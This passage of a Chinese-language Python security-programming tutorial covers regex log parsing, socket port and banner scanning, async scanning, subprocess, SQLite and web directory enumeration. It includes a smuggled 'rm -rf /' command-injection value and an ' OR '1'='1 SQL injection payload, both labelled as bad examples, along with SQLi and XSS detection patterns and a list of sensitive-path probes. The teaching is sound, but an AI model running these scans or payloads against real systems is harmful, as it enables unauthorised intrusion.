+    host = sys.argv[<span class="nu">1</span>] <span class="kw">if</span> len(sys.argv) > <span class="nu">1</span> <span class="kw">else</span> <span class="st">"127.0.0.1"</span>
+    result = <span class="fn">scan_host</span>(host)
+    <span class="fn">print</span>(<span class="st">f"\n[+] {host} 開放端口："</span>)
+    <span class="kw">for</span> port, info <span class="kw">in</span> sorted(result.items()):
+        <span class="fn">print</span>(<span class="st">f"  {port:5d}/tcp  OPEN  {info['banner'][:50]}"</span>)</pre>
+</div>
+<h3>異常處理最佳實踐</h3>
+<div class="cblock"><div class="ctop"><span class="clang">異常處理——安全工具健壯性關鍵</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="cm"># 錯誤示範：裸 except 隱藏所有錯誤</span>
+<span class="bad">try:
+    result = risky_operation()
+except:               # 捕獲所有異常，包括 KeyboardInterrupt！
+    pass              # 靜默失敗，難以調試</span>
+
+<span class="cm"># 正確示範：精確捕獲 + 記錄</span>
+<span class="kw">import</span> logging
+
+logging.basicConfig(level=logging.INFO,
+    format=<span class="st">'%(asctime)s %(levelname)s %(message)s'</span>)
+
+<span class="kw">def</span> <span class="fn">safe_request</span>(url: str) -> <span class="kw">None</span>:
+    <span class="kw">import</span> requests
+    <span class="kw">try</span>:
+        resp = requests.get(url, timeout=<span class="nu">5</span>, verify=<span class="kw">True</span>)
+        resp.raise_for_status()               <span class="cm"># 4xx/5xx 拋出異常</span>
+        <span class="kw">return</span> resp.text
+    <span class="kw">except</span> requests.exceptions.SSLError:
+        logging.warning(<span class="st">f"SSL 錯誤: {url}"</span>)
+    <span class="kw">except</span> requests.exceptions.Timeout:
+        logging.warning(<span class="st">f"連接超時: {url}"</span>)
+    <span class="kw">except</span> requests.exceptions.HTTPError <span class="kw">as</span> e:
+        logging.error(<span class="st">f"HTTP 錯誤 {e.response.status_code}: {url}"</span>)
+    <span class="kw">except</span> requests.exceptions.RequestException <span class="kw">as</span> e:
+        logging.error(<span class="st">f"請求失敗: {e}"</span>)
+    <span class="kw">return</span> <span class="kw">None</span>    <span class="cm"># 明確返回 None 表示失敗</span></pre>
+</div>
+</div>
+
+<div class="cb" id="l1-4">
+<h2>正規表達式與文字處理</h2>
+<p>正規表達式（Regex）是安全工程師的必備技能——從日誌中提取 IP 地址、找出告警中的 CVE 編號、驗證用戶輸入，都離不開正規表達式。Python 的 <code>re</code> 模組提供完整的正規表達式支援。</p>
+<div class="cblock"><div class="ctop"><span class="clang">安全場景中的正規表達式實戰</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="kw">import</span> re
+
+<span class="cm"># ─── 常用安全模式 ───</span>
+PATTERNS = {
+    <span class="st">"ip_v4"</span>:    <span class="st">r'\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b'</span>,
+    <span class="st">"ipv6"</span>:     <span class="st">r'(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}'</span>,
+    <span class="st">"cve"</span>:      <span class="st">r'CVE-\d{4}-\d{4,7}'</span>,
+    <span class="st">"url"</span>:      <span class="st">r'https?://[^\s"\'&gt;&lt;]+'</span>,
+    <span class="st">"email"</span>:    <span class="st">r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}'</span>,
+    <span class="st">"md5"</span>:      <span class="st">r'\b[a-fA-F0-9]{32}\b'</span>,
+    <span class="st">"sha256"</span>:   <span class="st">r'\b[a-fA-F0-9]{64}\b'</span>,
+    <span class="st">"b64"</span>:      <span class="st">r'(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?'</span>,
+    <span class="st">"sqli"</span>:     <span class="st">r"(?i)(\bunion\b.+\bselect\b|'\s*or\s*'1'\s*=\s*'1|--\s*$|/\*.*\*/)"</span>,
+    <span class="st">"xss"</span>:      <span class="st">r'(?i)(&lt;script|javascript:|onerror\s*=|&lt;img[^&gt;]+src\s*=)'</span>,
+}
+
+<span class="cm"># ─── 從日誌中提取所有 IP ───</span>
+log_line = <span class="st">"2024-01-15 14:32:11 Failed password from 192.168.100.50 port 54321"</span>
+ips = re.findall(PATTERNS[<span class="st">"ip_v4"</span>], log_line)
+<span class="fn">print</span>(<span class="st">f"提取 IP: {ips}"</span>)   <span class="cm"># ['192.168.100.50']</span>
+
+<span class="cm"># ─── 批量提取日誌中所有 CVE ───</span>
+text = <span class="st">"受 CVE-2021-44228 和 CVE-2022-0185 影響，另見 CVE-2023-46604"</span>
+cves = re.findall(PATTERNS[<span class="st">"cve"</span>], text)
+<span class="fn">print</span>(<span class="st">f"CVE 列表: {cves}"</span>)
+
+<span class="cm"># ─── 命名分組——解析結構化日誌 ───</span>
+nginx_pattern = re.compile(
+    <span class="st">r'(?P&lt;ip&gt;\S+) \S+ \S+ \[(?P&lt;time&gt;[^\]]+)\] '</span>
+    <span class="st">r'"(?P&lt;method&gt;\S+) (?P&lt;path&gt;\S+) \S+" (?P&lt;status&gt;\d{3}) (?P&lt;size&gt;\d+)'</span>
+)
+sample = <span class="st">'1.2.3.4 - - [15/Jan/2024:14:32:11 +0800] "GET /admin HTTP/1.1" 403 512'</span>
+m = nginx_pattern.match(sample)
+<span class="kw">if</span> m:
+    <span class="fn">print</span>(<span class="st">f"IP: {m['ip']}, 路徑: {m['path']}, 狀態: {m['status']}"</span>)
+    <span class="kw">if</span> m[<span class="st">'status'</span>] == <span class="st">'403'</span> <span class="kw">and</span> <span class="st">'admin'</span> <span class="kw">in</span> m[<span class="st">'path'</span>]:
+        <span class="fn">print</span>(<span class="st">f"[!] 可疑管理員路徑訪問: {m['ip']}"</span>)</pre>
+</div>
+<div class="quiz"><div class="q-lbl">小測驗</div>
+<div class="q-q">在 Python 中，以下哪種方式從日誌文本中提取所有 IP 地址效率最高、最準確？</div>
+<div class="q-opts">
+  <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span>用 <code>split()</code> 分割每行，再逐個元素判斷是否包含 "." 和數字</div>
+  <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">B</span>用 <code>str.find("IP:")</code> 找到關鍵字後截取後面的字符串</div>
+  <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">C</span>用 <code>re.findall()</code> 配合精確的 IPv4 正規表達式模式匹配</div>
+  <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span>用 <code>socket.gethostbyname()</code> 嘗試每個 token</div>
+</div>
+<div class="q-exp">正確！<code>re.findall()</code> 配合正確的正規表達式是最高效的方法，一行代碼就能從整個文本中提取所有符合 IPv4 格式的字符串，同時通過邊界匹配（<code>\b</code>）避免誤匹配（如 URL 中的數字段）。選項 A 會產生大量誤報，選項 B 假設了固定的格式，選項 D 會觸發 DNS 查詢極其低效且不準確。在安全工具開發中，掌握 <code>re.findall()</code>、<code>re.compile()</code>、命名分組 <code>(?P&lt;name&gt;...)</code> 是基本功。</div>
+</div>
+</div>
+<!-- CH2 -->
+<div class="cb" id="l2-1">
+<h2>Socket 網路編程基礎</h2>
+<p>Socket 是網路編程的基石。理解 TCP/UDP Socket 的工作機制，是開發端口掃描器、網路嗅探工具、自定義協議分析器的前提。</p>
+<div class="cblock"><div class="ctop"><span class="clang">TCP / UDP Socket 實戰</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="kw">import</span> socket
+
+<span class="cm"># ─── TCP 客戶端（模擬手工 HTTP 請求）───</span>
+<span class="kw">def</span> <span class="fn">raw_http_get</span>(host: str, path: str = <span class="st">"/"</span>) -> str:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(<span class="nu">5</span>)
+    s.connect((host, <span class="nu">80</span>))
+    request = (
+        <span class="st">f"GET {path} HTTP/1.1\r\n"</span>
+        <span class="st">f"Host: {host}\r\n"</span>
+        <span class="st">"Connection: close\r\n\r\n"</span>
+    ).encode(<span class="st">"utf-8"</span>)
+    s.sendall(request)
+    response = <span class="st">b""</span>
+    <span class="kw">while</span> <span class="kw">True</span>:
+        chunk = s.recv(<span class="nu">4096</span>)
+        <span class="kw">if</span> <span class="kw">not</span> chunk: <span class="kw">break</span>
+        response += chunk
+    s.close()
+    <span class="kw">return</span> response.decode(<span class="st">"utf-8"</span>, errors=<span class="st">"ignore"</span>)
+
+<span class="cm"># ─── Banner 抓取（識別服務版本）───</span>
+<span class="kw">def</span> <span class="fn">grab_banner</span>(host: str, port: int) -> str:
+    <span class="st">"""抓取服務 Banner（SSH/FTP/SMTP 等服務主動發送歡迎信息）"""</span>
+    <span class="kw">try</span>:
+        s = socket.socket()
+        s.settimeout(<span class="nu">3</span>)
+        s.connect((host, port))
+        banner = s.recv(<span class="nu">1024</span>).decode(<span class="st">"utf-8"</span>, errors=<span class="st">"replace"</span>).strip()
+        s.close()
+        <span class="kw">return</span> banner
+    <span class="kw">except</span>:
+        <span class="kw">return</span> <span class="st">""</span>
+
+<span class="cm"># 示例輸出：SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6</span>
+banner = <span class="fn">grab_banner</span>(<span class="st">"192.168.1.1"</span>, <span class="nu">22</span>)
+<span class="fn">print</span>(<span class="st">f"SSH Banner: {banner}"</span>)
+
+<span class="cm"># ─── UDP 掃描（DNS / SNMP 探測）───</span>
+<span class="kw">def</span> <span class="fn">udp_probe</span>(host: str, port: int) -> bool:
+    <span class="st">"""發送空 UDP 包，通過 ICMP port unreachable 判斷端口是否關閉"""</span>
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.settimeout(<span class="nu">2</span>)
+    <span class="kw">try</span>:
+        s.sendto(<span class="st">b""</span>, (host, port))
+        s.recvfrom(<span class="nu">1024</span>)   <span class="cm"># 收到回應說明開放或有響應</span>
+        <span class="kw">return</span> <span class="kw">True</span>
+    <span class="kw">except</span> socket.timeout:
+        <span class="kw">return</span> <span class="kw">True</span>    <span class="cm"># 超時可能是 filtered 或 open</span>
+    <span class="kw">except</span> ConnectionRefusedError:
+        <span class="kw">return</span> <span class="kw">False</span>   <span class="cm"># ICMP unreachable = closed</span>
+    <span class="kw">finally</span>:
+        s.close()
+
+<span class="cm"># ─── 原始 Socket（需要 root 權限）───</span>
+<span class="cm"># import struct</span>
+<span class="cm"># s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)</span>
+<span class="cm"># 用於構造自定義 ICMP/TCP/UDP 封包（掃描器進階用法）</span></pre>
+</div>
+</div>
+
+<div class="cb" id="l2-2">
+<h2>多執行緒與非同步 IO</h2>
+<p>網路安全工具的核心性能瓶頸在於 I/O 等待（等待目標響應）。利用多執行緒或非同步 IO，可以將掃描效率提升 10-100 倍——從逐個掃描 1000 個端口的幾十秒，壓縮到不到 1 秒。</p>
+<div class="cblock"><div class="ctop"><span class="clang">多執行緒 vs asyncio 性能對比</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="cm"># ─── 方法 1：ThreadPoolExecutor（最常用，簡單易用）───</span>
+<span class="kw">from</span> concurrent.futures <span class="kw">import</span> ThreadPoolExecutor, as_completed
+<span class="kw">import</span> time
+
+<span class="kw">def</span> <span class="fn">threaded_scan</span>(host: str, ports: list) -> dict:
+    results = {}
+    <span class="kw">with</span> ThreadPoolExecutor(max_workers=<span class="nu">100</span>) <span class="kw">as</span> pool:
+        future_to_port = {pool.submit(<span class="fn">check_port</span>, host, p): p <span class="kw">for</span> p <span class="kw">in</span> ports}
+        <span class="kw">for</span> future <span class="kw">in</span> as_completed(future_to_port):
+            p = future_to_port[future]
+            <span class="kw">try</span>:
+                results[p] = future.result()
+            <span class="kw">except</span> Exception <span class="kw">as</span> e:
+                results[p] = <span class="kw">False</span>
+    <span class="kw">return</span> results
+
+<span class="cm"># ─── 方法 2：asyncio（適合海量並發，如掃描整個 /16 子網）───</span>
+<span class="kw">import</span> asyncio
+
+<span class="kw">async def</span> <span class="fn">async_check_port</span>(host: str, port: int, timeout: float = <span class="nu">1.0</span>) -> tuple:
+    <span class="kw">try</span>:
+        reader, writer = <span class="kw">await</span> asyncio.wait_for(
+            asyncio.open_connection(host, port), timeout=timeout
+        )
+        writer.close()
+        <span class="kw">await</span> writer.wait_closed()
+        <span class="kw">return</span> port, <span class="kw">True</span>
+    <span class="kw">except</span>:
+        <span class="kw">return</span> port, <span class="kw">False</span>
+
+<span class="kw">async def</span> <span class="fn">async_scan</span>(host: str, ports: list) -> dict:
+    semaphore = asyncio.Semaphore(<span class="nu">500</span>)   <span class="cm"># 限制最大並發數，避免資源耗盡</span>
+    <span class="kw">async def</span> <span class="fn">bounded_check</span>(port):
+        <span class="kw">async with</span> semaphore:
+            <span class="kw">return</span> <span class="kw">await</span> <span class="fn">async_check_port</span>(host, port)
+    tasks = [<span class="fn">bounded_check</span>(p) <span class="kw">for</span> p <span class="kw">in</span> ports]
+    results = <span class="kw">await</span> asyncio.gather(*tasks)
+    <span class="kw">return</span> {p: is_open <span class="kw">for</span> p, is_open <span class="kw">in</span> results}
+
+<span class="cm"># 執行 asyncio</span>
+<span class="cm"># open_ports = asyncio.run(async_scan("192.168.1.1", range(1, 65536)))</span>
+
+<span class="cm"># ─── 性能對比（掃描 65535 個端口）───</span>
+<span class="cm"># 單執行緒：~65秒（每個 1ms 超時）</span>
+<span class="cm"># 100 線程：~0.8秒</span>
+<span class="cm"># asyncio：~0.3秒（受限於本地 semaphore 設置）</span></pre>
+</div>
+</div>
+
+<div class="cb" id="l2-3">
+<h2>系統與進程操作（os / subprocess）</h2>
+<p>在安全自動化腳本中，需要頻繁調用系統命令（如 nmap、openssl、nessus-cli）並處理輸出。<code>subprocess</code> 模組是 Python 調用外部命令的標準方式，同時 <code>os</code> 模組提供文件系統和進程操作。</p>
+<div class="cblock"><div class="ctop"><span class="clang">subprocess 安全調用系統命令</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="kw">import</span> subprocess, os, shlex
+
+<span class="cm"># ─── 安全調用外部命令（推薦：列表形式，避免 shell injection）───</span>
+<span class="kw">def</span> <span class="fn">run_nmap</span>(target: str, ports: str = <span class="st">"22,80,443,3306"</span>) -> str:
+    <span class="st">"""調用 nmap 掃描，返回輸出文本"""</span>
+    cmd = [<span class="st">"nmap"</span>, <span class="st">"-sV"</span>, <span class="st">"-p"</span>, ports, <span class="st">"--open"</span>, target]
+    <span class="kw">try</span>:
+        result = subprocess.run(
+            cmd,
+            capture_output=<span class="kw">True</span>,
+            text=<span class="kw">True</span>,
+            timeout=<span class="nu">120</span>,           <span class="cm"># 超時保護</span>
+            check=<span class="kw">True</span>             <span class="cm"># 非零退出碼拋出 CalledProcessError</span>
+        )
+        <span class="kw">return</span> result.stdout
+    <span class="kw">except</span> subprocess.TimeoutExpired:
+        <span class="kw">return</span> <span class="st">"ERROR: nmap 超時"</span>
+    <span class="kw">except</span> subprocess.CalledProcessError <span class="kw">as</span> e:
+        <span class="kw">return</span> <span class="st">f"ERROR: {e.stderr}"</span>
+
+<span class="cm"># 危險示範（不要這樣做！命令注入風險）</span>
+<span class="bad">user_input = "192.168.1.1; rm -rf /"
+os.system(f"nmap {user_input}")    # shell=True + 用戶輸入 = 命令注入！</span>
+
+<span class="cm"># ─── 文件系統操作（安全審計常用）───</span>
+<span class="kw">import</span> pathlib
+
+<span class="cm"># 遞歸查找所有配置文件</span>
+config_files = list(pathlib.Path(<span class="st">"/etc"</span>).rglob(<span class="st">"*.conf"</span>))
+
+<span class="cm"># 查找最近 24 小時修改的文件（入侵排查）</span>
+<span class="kw">import</span> time
+cutoff = time.time() - <span class="nu">86400</span>
+recent_modified = [
+    f <span class="kw">for</span> f <span class="kw">in</span> pathlib.Path(<span class="st">"/var/www"</span>).rglob(<span class="st">"*"</span>)
+    <span class="kw">if</span> f.is_file() <span class="kw">and</span> f.stat().st_mtime > cutoff
+]
+<span class="fn">print</span>(<span class="st">f"最近修改文件: {len(recent_modified)} 個"</span>)
+
+<span class="cm"># 計算文件 SHA256 哈希（完整性核查）</span>
+<span class="kw">import</span> hashlib
+
+<span class="kw">def</span> <span class="fn">file_sha256</span>(filepath: str) -> str:
+    h = hashlib.sha256()
+    <span class="kw">with</span> open(filepath, <span class="st">"rb"</span>) <span class="kw">as</span> f:
+        <span class="kw">for</span> chunk <span class="kw">in</span> iter(<span class="kw">lambda</span>: f.read(<span class="nu">65536</span>), <span class="st">b""</span>):
+            h.update(chunk)
+    <span class="kw">return</span> h.hexdigest()</pre>
+</div>
+</div>
+
+<div class="cb" id="l2-4">
+<h2>資料庫操作：SQLite / MySQL</h2>
+<p>安全工具常需要持久化數據——掃描結果、漏洞記錄、資產台帳。Python 的 <code>sqlite3</code> 無需安裝服務直接可用，適合小型工具；<code>mysql-connector-python</code> 或 <code>pymysql</code> 用於連接 MySQL 生產資料庫。</p>
+<div class="cblock"><div class="ctop"><span class="clang">SQLite 本地資料庫（掃描結果持久化）</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="kw">import</span> sqlite3
+<span class="kw">from</span> contextlib <span class="kw">import</span> contextmanager
+<span class="kw">from</span> datetime <span class="kw">import</span> datetime
+
+<span class="cm"># ─── 建立掃描結果資料庫 ───</span>
+<span class="kw">def</span> <span class="fn">init_db</span>(db_path: str = <span class="st">"scan_results.db"</span>) -> sqlite3.Connection:
+    conn = sqlite3.connect(db_path)
+    conn.row_factory = sqlite3.Row   <span class="cm"># 讓結果可用列名訪問</span>
+    conn.execute(<span class="st">"""
+        CREATE TABLE IF NOT EXISTS vulnerabilities (
+            id        INTEGER PRIMARY KEY AUTOINCREMENT,
+            host      TEXT NOT NULL,
+            port      INTEGER,
+            cve_id    TEXT,
+            severity  TEXT CHECK(severity IN ('Critical','High','Medium','Low','Info')),
+            title     TEXT,
+            cvss      REAL,
+            found_at  TEXT DEFAULT CURRENT_TIMESTAMP,
+            status    TEXT DEFAULT 'Open'
+        )
+    """</span>)
+    conn.commit()
+    <span class="kw">return</span> conn
+
+<span class="cm"># ─── 安全插入（使用參數化查詢！防 SQL 注入）───</span>
+<span class="kw">def</span> <span class="fn">insert_vuln</span>(conn, host, port, cve, severity, title, cvss):
+    <span class="cm"># 正確：使用 ? 佔位符，絕不拼接字符串</span>
+    conn.execute(
+        <span class="st">"INSERT INTO vulnerabilities(host,port,cve_id,severity,title,cvss) VALUES(?,?,?,?,?,?)"</span>,
+        (host, port, cve, severity, title, cvss)
+    )
+    conn.commit()
+
+<span class="cm"># 錯誤示範（SQL 注入風險）</span>
+<span class="bad">user = input("Host: ")
+conn.execute(f"SELECT * FROM vulnerabilities WHERE host='{user}'")</span>
+<span class="cm"># 輸入 ' OR '1'='1 即可拿到所有數據</span>
+
+<span class="cm"># ─── 查詢與統計 ───</span>
+<span class="kw">def</span> <span class="fn">get_critical_vulns</span>(conn) -> list:
+    cursor = conn.execute(
+        <span class="st">"SELECT host, cve_id, title FROM vulnerabilities WHERE severity='Critical' ORDER BY cvss DESC"</span>
+    )
+    <span class="kw">return</span> [dict(row) <span class="kw">for</span> row <span class="kw">in</span> cursor.fetchall()]
+
+<span class="kw">def</span> <span class="fn">vuln_summary</span>(conn) -> dict:
+    cursor = conn.execute(
+        <span class="st">"SELECT severity, COUNT(*) as cnt FROM vulnerabilities GROUP BY severity"</span>
+    )
+    <span class="kw">return</span> {row[<span class="st">"severity"</span>]: row[<span class="st">"cnt"</span>] <span class="kw">for</span> row <span class="kw">in</span> cursor}
+
+<span class="cm"># ─── 導出 CSV 報告 ───</span>
+<span class="kw">import</span> csv, io
+<span class="kw">def</span> <span class="fn">export_csv</span>(conn, output_path: str):
+    cursor = conn.execute(<span class="st">"SELECT host,port,cve_id,severity,cvss,title FROM vulnerabilities ORDER BY cvss DESC"</span>)
+    <span class="kw">with</span> open(output_path, <span class="st">"w"</span>, newline=<span class="st">""</span>, encoding=<span class="st">"utf-8-sig"</span>) <span class="kw">as</span> f:
+        writer = csv.writer(f)
+        writer.writerow([<span class="st">"Host"</span>,<span class="st">"Port"</span>,<span class="st">"CVE"</span>,<span class="st">"Severity"</span>,<span class="st">"CVSS"</span>,<span class="st">"Title"</span>])
+        writer.writerows(cursor.fetchall())
+    <span class="fn">print</span>(<span class="st">f"已導出到 {output_path}"</span>)</pre>
+</div>
+<div class="quiz"><div class="q-lbl">小測驗</div>
+<div class="q-q">以下 Python 代碼中，哪一行存在安全漏洞？應該如何修復？<br><code>host = request.args.get("host")</code><br><code>rows = db.execute(f"SELECT * FROM assets WHERE host='{host}'")</code></div>
+<div class="q-opts">
+  <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span>第一行有問題，<code>request.args.get()</code> 不安全，應改用 <code>request.form.get()</code></div>
+  <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">B</span>第二行有 SQL 注入漏洞，應改為 <code>db.execute("SELECT * FROM assets WHERE host=?", (host,))</code></div>
+  <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">C</span>兩行都沒問題，f-string 格式化是 Python 的標準做法</div>
+  <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span>第二行有問題，但只要在 host 前加 <code>str()</code> 轉換即可修復</div>
+</div>
+<div class="q-exp">正確！第二行使用 f-string 將用戶輸入直接拼接進 SQL 語句，存在<strong>嚴重 SQL 注入漏洞</strong>。攻擊者輸入 <code>' OR '1'='1</code> 即可繞過查詢條件。修復方法是使用<strong>參數化查詢</strong>（Parameterized Query）：<code>db.execute("SELECT * FROM assets WHERE host=?", (host,))</code>，讓數據庫驅動負責安全轉義，而非手動拼接字符串。無論是 SQLite、MySQL、PostgreSQL，都必須使用參數化查詢來防止 SQL 注入。</div>
+</div>
+</div>
+<!-- CH3 -->
+<div class="cb" id="l3-1">
+<h2>HTTP 協議與 requests 庫實戰</h2>
+<p><code>requests</code> 是 Python 最受歡迎的 HTTP 庫，在安全測試中用於發送自定義請求、模擬登入、測試 API 安全、枚舉目錄等場景。</p>
+<div class="cblock"><div class="ctop"><span class="clang">requests 安全測試進階用法</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="kw">import</span> requests
+<span class="kw">from</span> requests.adapters <span class="kw">import</span> HTTPAdapter
+<span class="kw">from</span> urllib3.util.retry <span class="kw">import</span> Retry
+
+<span class="cm"># ─── 建立帶重試的 Session（批量掃描必備）───</span>
+<span class="kw">def</span> <span class="fn">create_session</span>(proxy: str = <span class="kw">None</span>) -> requests.Session:
+    session = requests.Session()
+    retry = Retry(total=<span class="nu">3</span>, backoff_factor=<span class="nu">0.3</span>,
+                  status_forcelist=[<span class="nu">500</span>, <span class="nu">502</span>, <span class="nu">503</span>])
+    adapter = HTTPAdapter(max_retries=retry)
+    session.mount(<span class="st">"http://"</span>, adapter)
+    session.mount(<span class="st">"https://"</span>, adapter)
+    session.headers.update({
+        <span class="st">"User-Agent"</span>: <span class="st">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"</span>
+    })
+    <span class="kw">if</span> proxy:
+        session.proxies = {<span class="st">"http"</span>: proxy, <span class="st">"https"</span>: proxy}
+    <span class="kw">return</span> session
+
+<span class="cm"># ─── 目錄枚舉（常見路徑探測）───</span>
+PATHS = [<span class="st">"/admin"</span>,<span class="st">"/.env"</span>,<span class="st">"/config.php"</span>,<span class="st">"/.git/config"</span>,
+         <span class="st">"/api/v1/users"</span>,<span class="st">"/phpinfo.php"</span>,<span class="st">"/actuator/env"</span>,<span class="st">"/swagger-ui.html"</span>]
+
+<span class="kw">def</span> <span class="fn">dir_enum</span>(base_url: str, session: requests.Session) -> list:
+    found = []
+    <span class="kw">for</span> path <span class="kw">in</span> PATHS:
+        <span class="kw">try</span>:
+            r = session.get(<span class="st">f"{base_url}{path}"</span>, timeout=<span class="nu">5</span>,
+                            allow_redirects=<span class="kw">False</span>, verify=<span class="kw">False</span>)
+            <span class="kw">if</span> r.status_code <span class="kw">not in</span> (<span class="nu">404</span>, <span class="nu">400</span>):
+                found.append({<span class="st">"path"</span>: path, <span class="st">"status"</span>: r.status_code,
+                               <span class="st">"size"</span>: len(r.content)})
+                <span class="fn">print</span>(<span class="st">f"  [{r.status_code}] {path} ({len(r.content)} bytes)"</span>)
+        <span class="kw">except</span> requests.RequestException:
+            <span class="kw">pass</span>
+    <span class="kw">return</span> found
+
+<span class="cm"># ─── HTTP 響應頭安全分析 ───</span>
+SECURITY_HEADERS = [
+    <span class="st">"X-Frame-Options"</span>,<span class="st">"Content-Security-Policy"</span>,<span class="st">"X-Content-Type-Options"</span>,
+    <span class="st">"Strict-Transport-Security"</span>,<span class="st">"X-XSS-Protection"</span>,<span class="st">"Referrer-Policy"</span>
+]
+<span class="kw">def</span> <span class="fn">check_security_headers</span>(url: str) -> dict:
+    r = requests.head(url, timeout=<span class="nu">5</span>, verify=<span class="kw">False</span>)
+    result = {}
+    <span class="kw">for</span> h <span class="kw">in</span> SECURITY_HEADERS:
+        result[h] = r.headers.get(h, <span class="ok">"MISSING"</span>)
+    <span class="cm"># 版本洩露檢查</span>
+    server = r.headers.get(<span class="st">"Server"</span>, <span class="st">""</span>)
+    <span class="kw">if</span> any(v <span class="kw">in</span> server <span class="kw">for</span> v <span class="kw">in</span> [<span class="st">"Apache/"</span>,<span class="st">"nginx/"</span>,<span class="st">"IIS/"</span>]):
+        result[<span class="st">"VERSION_LEAK"</span>] = server
+    <span class="kw">return</span> result</pre>
+</div>
+</div>
+
+<div class="cb" id="l3-2">
+<h2>BeautifulSoup / lxml 爬蟲解析</h2>
+<p>在安全測試中，爬取 Web 頁面用於：提取頁面中的敏感信息（如隱藏的 input 字段、注釋中的敏感路徑）、批量收集 URL 進行後續測試、分析表單參數尋找注入點。</p>
+<div class="cblock"><div class="ctop"><span class="clang">BeautifulSoup 安全測試應用</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="kw">from</span> bs4 <span class="kw">import</span> BeautifulSoup
+<span class="kw">import</span> requests, re
+
+<span class="kw">def</span> <span class="fn">analyze_page</span>(url: str) -> dict:
+    <span class="st">"""分析頁面提取安全相關信息"""</span>
+    r = requests.get(url, timeout=<span class="nu">10</span>, verify=<span class="kw">False</span>)
+    soup = BeautifulSoup(r.text, <span class="st">"lxml"</span>)
+
+    findings = {<span class="st">"forms"</span>: [], <span class="st">"links"</span>: [], <span class="st">"comments"</span>: [],
+                <span class="st">"hidden_inputs"</span>: [], <span class="st">"emails"</span>: []}
+
+    <span class="cm"># 提取所有表單（尋找注入點）</span>
+    <span class="kw">for</span> form <span class="kw">in</span> soup.find_all(<span class="st">"form"</span>):
+        form_info = {
+            <span class="st">"action"</span>: form.get(<span class="st">"action"</span>),
+            <span class="st">"method"</span>: form.get(<span class="st">"method"</span>, <span class="st">"GET"</span>).upper(),
+            <span class="st">"inputs"</span>: [{<span class="st">"name"</span>: i.get(<span class="st">"name"</span>), <span class="st">"type"</span>: i.get(<span class="st">"type"</span>,<span class="st">"text"</span>)}
+                        <span class="kw">for</span> i <span class="kw">in</span> form.find_all(<span class="st">"input"</span>)]
+        }
+        findings[<span class="st">"forms"</span>].append(form_info)
+
+    <span class="cm"># 提取隱藏 input（常含 CSRF token / 敏感路徑）</span>
+    findings[<span class="st">"hidden_inputs"</span>] = [
+        {<span class="st">"name"</span>: i.get(<span class="st">"name"</span>), <span class="st">"value"</span>: i.get(<span class="st">"value"</span>)}
+        <span class="kw">for</span> i <span class="kw">in</span> soup.find_all(<span class="st">"input"</span>, type=<span class="st">"hidden"</span>)
+    ]
+
+    <span class="cm"># 提取 HTML 注釋（常含開發者遺留的敏感信息）</span>
+    <span class="kw">from</span> bs4 <span class="kw">import</span> Comment
+    comments = soup.find_all(string=<span class="kw">lambda</span> t: isinstance(t, Comment))
+    findings[<span class="st">"comments"</span>] = [c.strip() <span class="kw">for</span> c <span class="kw">in</span> comments <span class="kw">if</span> len(c.strip()) > <span class="nu">3</span>]
+
+    <span class="cm"># 提取頁面內所有郵件地址</span>
+    text = soup.get_text()
+    findings[<span class="st">"emails"</span>] = list(set(re.findall(
+        <span class="st">r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}'</span>, text
+    )))
+
+    <span class="kw">return</span> findings
+
+<span class="cm"># 遞歸爬取站點所有頁面並收集 URL</span>
+<span class="kw">def</span> <span class="fn">crawl_site</span>(base_url: str, max_pages: int = <span class="nu">50</span>) -> set:
+    visited, to_visit = set(), {base_url}
+    <span class="kw">while</span> to_visit <span class="kw">and</span> len(visited) < max_pages:
+        url = to_visit.pop()
+        <span class="kw">if</span> url <span class="kw">in</span> visited: <span class="kw">continue</span>
+        <span class="kw">try</span>:
+            r = requests.get(url, timeout=<span class="nu">5</span>, verify=<span class="kw">False</span>)
+            visited.add(url)
+            soup = BeautifulSoup(r.text, <span class="st">"lxml"</span>)
+            <span class="kw">for</span> a <span class="kw">in</span> soup.find_all(<span class="st">"a"</span>, href=<span class="kw">True</span>):
+                href = a[<span class="st">"href"</span>]
+                <span class="kw">if</span> href.startswith(<span class="st">"/"</span>):
+                    to_visit.add(base_url.rstrip(<span class="st">"/"</span>) + href)
+        <span class="kw">except</span>: <span class="kw">pass</span>
+    <span class="kw">return</span> visited</pre>
+</div>
+</div>
+
+<div class="cb" id="l3-3">
+<h2>Flask Web 框架入門</h2>
+<p>Flask 是 Python 最輕量的 Web 框架，在安全工具開發中用於：構建本地漏洞管理 Dashboard、開發安全測試 API 服務端、搭建 C2（Command & Control）服務（授權測試環境）、以及搭建靶機環境練習防禦。</p>
